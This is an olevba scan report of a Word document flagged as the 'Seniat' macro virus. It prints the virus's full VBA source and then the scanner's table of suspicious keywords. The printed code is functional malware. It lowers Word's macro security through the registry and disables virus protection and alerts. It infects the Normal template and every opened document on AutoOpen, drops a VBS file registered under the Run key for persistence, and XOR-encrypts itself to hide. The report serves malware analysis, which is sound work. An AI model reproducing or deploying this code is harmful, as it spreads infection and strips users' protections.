olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Seniat
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Seniat - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Seniat.bas 
in file: Virus.MSWord.Seniat - OLE stream: 'Macros/VBA/Seniat'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Enc
Private Sub Infe()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
With Options: .VirusProtection = Not -1: .ConfirmConversions = Not -1: End With
With Application: .ScreenUpdating = Not -1: .DisplayStatusBar = Not -1: .DisplayAlerts = Not -1: End With
Set noA = Word.Application.NormalTemplate
Set doA = Word.Application.ActiveDocument
Set noB = noA.VBProject.VBComponents
Set doB = doA.VBProject.VBComponents
EnNormal = False: EnDocume = False
RutaVX = Environ("WinDir") & "\system\mswrdrv.vxd"
RutaBK = Environ("WinDir") & "\system\mswrdrv.sys.vbs"
For I = 1 To noB.Count
If (noB.Item(I).Name = "Seniat") Then EnNormal = True
Next
For I = 1 To doB.Count
If (doB.Item(I).Name = "Seniat") Then EnDocume = True
Next
If (EnNormal = False) Then
doB.Item("Seniat").Export (RutaVX)
noB.Import (RutaVX)
End If
If (EnDocume = False) Then
noB.Item("Seniat").Export (RutaVX)
doB.Import (RutaVX)
End If
If (Dir(Environ("WinDir") & "\wscript.exe") = "wscript.exe") Then
Open RutaBK For Output As #9
Print #9, "On Error Resume Next"
Print #9, "Set wrd = CreateObject(""Word.Application"")"
Print #9, "Presente = False"
Print #9, "For I = 1 To wrd.NormalTemplate.VBProject.VBComponents.Count"
Print #9, "If (wrd.NormalTemplate.VBProject.VBComponents.Item(I).Name = ""Seniat"") Then Presente = True"
Print #9, "Next"
Print #9, "If (Presente = False) Then wrd.NormalTemplate.VBProject.VBComponents.Import (""" & RutaVX & """)"
Print #9, "wrd.Quit"
Close #9
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Seniat") = RutaBK
End If
Randomize
ranx = Int(20 * Rnd + 1)
If (Day(Now) = 22) And (ranx = 10) Then
doA.Content = doA.Content & vbCrLf & vbCrLf & "-= Seniat Por LiteSYS/Xaker - Venezuela 2001 =-" & vbCrLf & "Seniat: corrupción tributaria en acción" & vbCrLf & "Aprendan a cobrar impuestos! Choros!"
End If
End Sub
Private Function cr(poc As String) As String: For I = 1 To Len(poc): mol = Asc(Mid(poc, I, 1)) Xor 30: noc$ = noc$ & Chr(mol): Next: cr = noc$: End Function
Private Function kr()
On Error Resume Next
Set vbObj = VBE.ActiveVBProject.VBComponents.Item("Seniat").CodeModule
Enc = False: Dec = False
If (vbObj.Lines(1, 1) = "'Enc") Then Enc = True
If (vbObj.Lines(1, 1) = "'Dec") Then Dec = True
For I = 3 To 45
ko$ = vbObj.Lines(I, 1)
If (Enc = True) Then ko = "'" & cr(ko)
If (Dec = True) Then ko = cr(Mid(ko, 2, Len(ko)))
vbObj.ReplaceLine I, ko
Next
If (Enc = True) Then vbObj.ReplaceLine 1, "'Dec"
If (Dec = True) Then vbObj.ReplaceLine 1, "'Enc"
End Function
Sub AutoOpen()
On Error Resume Next
Set vbObl = VBE.ActiveVBProject.VBComponents(1).CodeModule
If (vbObl.Lines(1, 1) = "'Dec") Then Call kr
Call Infe
Call kr
If (ActiveDocument.Saved = False) Then ActiveDocument.Save
End Sub
Sub ToolsMacro()
End Sub
Sub ViewVBCode()
End Sub
Sub FileTemplates()
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |sys.vbs             |Executable file name                         |
|IOC       |wscript.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

